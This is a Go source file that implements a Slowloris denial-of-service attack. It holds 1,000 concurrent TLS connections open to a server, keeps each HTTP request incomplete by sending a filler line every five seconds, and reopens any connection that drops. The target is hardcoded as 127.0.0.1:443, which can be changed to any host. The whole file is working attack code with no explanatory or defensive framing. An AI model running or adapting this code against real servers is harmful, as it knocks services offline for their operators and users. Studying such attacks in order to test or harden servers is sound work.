package main

import (
    "fmt"
    _"net"
    "time"
    "crypto/tls"
)

const IP_TO_SERVER = "127.0.0.1:443"
const HTTP_GET = "GET / HTTP/1.0"
const HTTP_END = "\r\n\r\n"
const AMOUNT_OF_THREADS = 1000

func createSocket() *tls.Conn { 
    config :=  tls.Config{InsecureSkipVerify: true}

    conn, err := tls.Dial("tcp", IP_TO_SERVER, &config)
    if err != nil {
       fmt.Println("failed to open connection") 
        return nil
    }
    return conn
}

func slowHttp() {
    conn := createSocket()
    if conn == nil {
        return 
    }
    conn.Write([]byte(HTTP_GET))
    for true {
        time.Sleep(5 * time.Second) 
        conn.Write([]byte("1337\r"))
    }
    conn.Close()
}

func readFromServer(conn *tls.Conn) { 
    buff := make([]byte, 20)
    n,_:= conn.Read(buff)
    fmt.Printf("Got %s\n", buff[:n])
}

func slowHttpWithChannel(ch chan int) {
    slowHttp()
    fmt.Println("connection down")
    ch <- 1
    
}

func slowloris() {
    ch := make(chan int)
    for i:=0; i < AMOUNT_OF_THREADS; i++ {
        go slowHttpWithChannel(ch)
        
    }
    fmt.Println("Created ", AMOUNT_OF_THREADS, " connections")
    for true {
        fmt.Println("Waiting for thread to go down")
        <-ch
        go slowHttpWithChannel(ch)
        
    }
}


func main() {
    fmt.Println("SlowLoris")
    slowloris()
}
